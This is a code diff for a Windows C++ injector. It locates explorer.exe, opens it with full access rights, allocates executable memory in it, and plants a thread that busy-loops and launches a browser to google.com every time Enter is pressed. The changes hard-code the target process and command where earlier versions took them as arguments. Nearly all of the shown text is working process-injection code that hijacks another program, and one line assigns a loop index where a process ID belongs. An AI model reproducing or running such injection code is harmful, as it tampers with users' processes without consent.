@@ -4,9 +4,14 @@
 #include <string>
 #include <vector>
 #include <sstream>
+#include <psapi.h>
 
 #define DATA_CHUNK_SIZE 1024
 #define CODE_CHUNK_SIZE 1024
+
+#define PROCESS_COMMAND "explorer http://www.google.com"
+#define PROCESS_NAME    "explorer.exe"
+#define MAX_PROCESS_IDS 128
 
 #define ASSERT( expr, msg )\
   if ( !expr ){\
@@ -34,7 +39,11 @@ struct InjData
 
 static DWORD ThreadFunc( InjData *pData )
 {
-  pData->fnMessageBox( NULL, NULL, NULL, MB_ICONEXCLAMATION );
+  while ( true )
+  {
+    if ( pData->fnGetAsyncKeyState( VK_RETURN ) & 0x8000 )
+      pData->fnCreateProcess( NULL, pData->szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &pData->si, &pData->pi );
+  }
 
   return 0;
 }
@@ -42,24 +51,11 @@ static void DummyFunc() {}
 
 typedef std::vector<std::string> StringVec;
 
-int APIENTRY WinMain( HINSTANCE, HINSTANCE, LPSTR args, int )
+int APIENTRY WinMain( HINSTANCE, HINSTANCE, LPSTR, int )
 {
-  StringVec argv;
-  std::stringstream ssArgs( args );
-  argv.push_back( "hai2u" );
-  while ( !ssArgs.eof() )
-  {
-    std::string str;
-    ssArgs >> str;
-    if ( !str.empty() )
-      argv.push_back( str );
-  }
-  int argc = (int)argv.size();
-
-  ASSERT( ( argc == 3 ), ( std::string( argv[0] ) + " [site url] [process id]" ).c_str() );
-
   // data
   HANDLE    hProc;
+  DWORD     dwPID;
   HANDLE    hThread;
   PBYTE     pData;
   PBYTE     pCode;
@@ -70,15 +66,31 @@ int APIENTRY WinMain( HINSTANCE, HINSTANCE, LPSTR args, int )
   injData.fnGetAsyncKeyState  = &GetAsyncKeyState;
   injData.fnSleep             = &Sleep;
   injData.fnMessageBox        = &MessageBoxA;
-  strcpy( injData.szCmd, ( std::string( "explorer " ) + argv[1] ).c_str() );
+  strcpy( injData.szCmd, PROCESS_COMMAND );
   memset( &injData.si, 0, sizeof( injData.si ) );
   injData.si.cb = sizeof( injData.si );
   memset( &injData.pi, 0, sizeof( injData.pi ) );
 
-  // Step 1: Get full access to remote process
-  //SetPrivileges(  );
-  hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi( argv[2].c_str() ) );
-  ASSERT( hProc != NULL, "opening process with full access rights failed =(" );
+  // Step 1: Find and gain access to process
+  DWORD nProcesses;
+  DWORD processIDs[MAX_PROCESS_IDS];
+  EnumProcesses( processIDs, sizeof( processIDs ), &nProcesses );
+  nProcesses /= sizeof( DWORD );
+
+  for ( DWORD i = 0; i < nProcesses; ++i )
+  {
+    hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, processIDs[i] );
+    if ( hProc )
+    {
+      char szProcName[MAX_PATH];
+      GetProcessImageFileNameA( hProc, szProcName, sizeof( szProcName ) );
+      if ( std::string( szProcName ).find( PROCESS_NAME ) != std::string::npos )
+      {
+        dwPID = i;
+        break;
+      }
+    }
+  }
 
   // Step 2: Allocate block of memory for data in remote process
   pData = (PBYTE)VirtualAllocEx( hProc, NULL, DATA_CHUNK_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
